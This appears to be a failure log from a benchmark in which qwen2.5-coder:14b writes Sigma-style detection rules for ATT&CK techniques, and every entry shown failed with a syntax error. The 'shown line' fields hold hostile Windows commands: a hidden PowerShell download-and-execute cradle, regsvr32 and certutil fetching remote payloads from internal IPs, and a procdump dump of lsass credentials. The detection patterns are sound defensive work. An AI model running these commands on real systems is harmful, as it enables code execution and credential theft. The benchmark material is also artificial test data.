# Non-PASS first-try rules

qwen2.5-coder:14b T1059.001 repeat 1: SYNTAX_ERROR
Error: Unsupported type: <class 'dict'>
Shown line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')
Variant: 
Detection:
selection_img:
  Image|endswith: \powershell.exe
selection_cli:
  CommandLine|contains|all:
  - windash: -nop
  - windash: -w hidden
  - windash: -c IEX
  - New-Object Net.WebClient
  - DownloadString
condition: all of selection_*

qwen2.5-coder:14b T1059.001 repeat 2: SYNTAX_ERROR
Error: Unsupported type: <class 'dict'>
Shown line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')
Variant: 
Detection:
selection_img:
  Image|endswith: \powershell.exe
selection_cli:
  CommandLine|contains|all:
  - windash: -nop
  - windash: -w hidden
  - windash: -c IEX
  - New-Object Net.WebClient
  - DownloadString
condition: all of selection_*

qwen2.5-coder:14b T1059.001 repeat 3: SYNTAX_ERROR
Error: Unsupported type: <class 'dict'>
Shown line: powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')
Variant: 
Detection:
selection_img:
  Image|endswith: \powershell.exe
selection_cli:
  CommandLine|contains|all:
  - windash: -nop
  - windash: -w hidden
  - windash: -c IEX
  - New-Object Net.WebClient
  - DownloadString
condition: all of selection_*

qwen2.5-coder:14b T1218.010 repeat 1: SYNTAX_ERROR
Error: Unsupported type: <class 'dict'>
Shown line: regsvr32.exe /s /u /i:http://192.168.1.10/file.sct scrobj.dll
Variant: 
Detection:
selection_img:
  Image|endswith: \regsvr32.exe
selection_cli:
  CommandLine|contains|all:
  - windash: -s
  - windash: -u
  - windash: -i:http://
condition: all of selection_*

qwen2.5-coder:14b T1218.010 repeat 2: SYNTAX_ERROR
Error: Unsupported type: <class 'dict'>
Shown line: regsvr32.exe /s /u /i:http://192.168.1.10/file.sct scrobj.dll
Variant: 
Detection:
selection_img:
  Image|endswith: \regsvr32.exe
selection_cli:
  CommandLine|contains|all:
  - windash: -s
  - windash: -u
  - windash: -i:http
condition: all of selection_*

qwen2.5-coder:14b T1218.010 repeat 3: SYNTAX_ERROR
Error: Unsupported type: <class 'dict'>
Shown line: regsvr32.exe /s /u /i:http://192.168.1.10/file.sct scrobj.dll
Variant: 
Detection:
selection_img:
  Image|endswith: \regsvr32.exe
selection_cli:
  CommandLine|contains|all:
  - windash: -s
  - windash: -u
  - windash: -i:http://
condition: all of selection_*

qwen2.5-coder:14b T1105 repeat 2: SYNTAX_ERROR
Error: Unsupported type: <class 'dict'>
Shown line: certutil.exe -urlcache -f http://10.0.0.5/payload.exe payload.exe
Variant: 
Detection:
selection_img:
  Image|endswith: \certutil.exe
selection_cli:
  CommandLine|contains|all:
  - windash: -urlcache
  - windash: -f
  - http://
condition: all of selection_*

qwen2.5-coder:14b T1003.001 repeat 1: SYNTAX_ERROR
Error: Unsupported type: <class 'dict'>
Shown line: procdump.exe -ma lsass.exe lsass.dmp
Variant: 
Detection:
selection_img:
  Image|endswith: \procdump.exe
selection_cli:
  CommandLine|contains|all:
  - windash: -ma
  - lsass.exe
condition: all of selection_*

qwen2.5-coder:14b T1003.001 repeat 2: SYNTAX_ERROR
Error: Unsupported type: <class 'dict'>
Shown line: procdump.exe -ma lsass.exe lsass.dmp
Variant: 
Detection:
selection_img:
  Image|endswith: \procdump.exe
selection_cli:
  CommandLine|contains|all:
  - windash: -ma
  - lsass.exe
condition: all of selection_*

qwen2.5-coder:14b T1003.001 repeat 3: SYNTAX_ERROR
Error: Unsupported type: <class 'dict'>
Shown line: procdump.exe -ma lsass.exe lsass.dmp
Variant: 
Detection:
selection_img:
  Image|endswith: \procdump.exe
selection_cli:
  CommandLine|contains|all:
  - windash: -ma
  - lsass.exe
condition: all of selection_*

